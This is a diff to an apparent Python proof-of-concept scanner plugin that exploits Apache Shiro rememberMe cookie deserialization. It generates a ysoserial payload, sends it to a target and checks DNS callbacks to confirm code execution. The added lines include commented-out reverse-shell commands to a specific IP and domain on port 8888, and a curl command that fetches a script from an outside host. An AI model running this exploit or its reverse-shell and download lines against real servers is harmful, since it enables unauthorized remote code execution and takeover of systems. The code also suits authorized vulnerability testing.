@@ -19,7 +19,7 @@ import requests
 from Crypto.Cipher import AES
 from plugin.cloudeye import CloudEye
 
-JAR_FILE = '/home/xy/exps/ysoserial/target/ysoserial-0.0.5-SNAPSHOT-all.jar'
+JAR_FILE = '/Users/yea/tool/git/ysoserial/target/ysoserial-master.jar'
 
 
 def poc(url):
@@ -30,19 +30,26 @@ def poc(url):
     try:
         cloudeye = CloudEye()
         domain = cloudeye.getRandomDomain('shiro')  # 设置dns特征域名组
-        rce_command = 'ping -n 3 %s || ping -c 3 %s' % (domain, domain)  # 目标机执行的代码
+        # ping -c 3 klafqmkpbp.shiro.06pec0.ceye.io
+        # bash -i >& /dev/tcp/init1.in/8888 0>&1
+        # bash -i >& /dev/tcp/104.224.135.203/8888 0>&1
+        rce_command = 'ping -c 3 %s' % (domain)  # 目标机执行的代码
+        # rce_command = 'bash -i >& /dev/tcp/104.224.135.203/8888 0>&1'
+        # rce_command = "curl init1.in:8888/sh.py "
+        # rce_command = "python sh.py"
         payload = generator(rce_command, JAR_FILE)  # 生成payload
-        requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)  # 发送验证请求
-
+        rsp = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=2)  # 发送验证请求
+        # print rsp
         dnslog = cloudeye.getDnsRecord(delay=2)
         if domain in dnslog:
             msg = url
-            for each in re.findall(r'client (.*)#', dnslog):  # 获取出口ip
-                msg += ' - ' + each
+            for remote_addr in re.findall(r'\d+\.\d+\.\d+\.\d+', dnslog):  # 获取出口ip
+                msg += ' - ' + remote_addr
             return msg
 
     except Exception, e:
-        pass
+        # pass
+        print e
     return False
 
 
